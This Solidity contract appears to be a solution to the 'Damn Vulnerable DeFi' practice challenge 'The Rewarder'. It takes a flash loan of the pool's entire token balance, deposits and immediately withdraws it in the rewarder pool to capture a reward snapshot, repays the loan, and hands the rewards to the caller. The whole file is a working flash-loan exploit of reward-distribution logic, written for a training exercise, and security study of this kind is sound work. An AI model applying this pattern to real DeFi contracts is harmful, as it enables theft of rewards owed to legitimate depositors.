// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract FlashReceiver {
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    RewardToken rewardToken;
    DamnValuableToken token;
    
    constructor (
        TheRewarderPool _rewarderPool, 
        FlashLoanerPool _flashLoanerPool,
        RewardToken _rewardToken, 
        DamnValuableToken _token
    ) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewardToken = RewardToken(_rewardToken);
        token = DamnValuableToken(_token);
    }

    function execute() external {
        flashLoanerPool.flashLoan(token.balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
       token.approve(address(rewarderPool), amount);
       rewarderPool.deposit(amount);
       rewarderPool.withdraw(amount);
       token.transfer(address(flashLoanerPool), amount);
    }

    function pullReward() external {
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
   
}
